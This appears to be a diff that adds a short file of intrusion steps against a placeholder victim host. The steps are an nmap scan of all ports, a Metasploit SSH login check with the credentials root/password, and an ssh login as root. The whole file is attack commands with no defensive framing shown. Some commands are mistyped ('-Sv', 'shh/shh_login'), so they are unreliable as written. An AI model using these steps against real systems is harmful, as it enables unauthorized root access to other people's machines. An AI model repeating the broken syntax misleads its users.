@@ -1,0 +1,19 @@
+nmap -Sv -p- <victim IP address>
+
+msfconsole
+
+use auxiliary/scanner/shh/shh_login
+
+set RHOSTS <victim IP address>
+
+set RPORT 22
+
+set USERNAME root
+
+set PASSWORD password
+
+run
+
+ssh root@<victim IP address>
+
+<Write the victim's password>
